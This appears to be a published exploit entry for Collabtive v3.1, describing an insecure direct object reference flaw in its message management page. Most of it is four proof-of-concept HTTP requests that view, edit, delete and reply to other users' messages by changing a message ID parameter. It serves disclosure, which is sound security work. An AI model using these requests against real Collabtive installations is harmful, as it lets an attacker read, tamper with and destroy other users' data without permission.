# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view/update/delete/reply the message that owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /managemessage.php?action=showmessage&mid=2(CHANGE HERE)&id=1(ATTACK'S PROJECT ID) HTTP/1.1
```

```
POST /managemessage.php?action=edit&id=1 HTTP/1.1
...

title=message2&text=mmm2+user1&mid=2(CHANGE HERE)
```

```
GET /managemessage.php?action=del&mid=2(CHANGE HERE)&id=1 HTTP/1.1
```

```
POST /managemessage.php?action=reply&id=1 HTTP/1.1
...

title=Re%3A+message1&text=aaaaa&thefiles=0&sendto%5B%5D=all&desc=&mid=2(CHANGE HERE)
```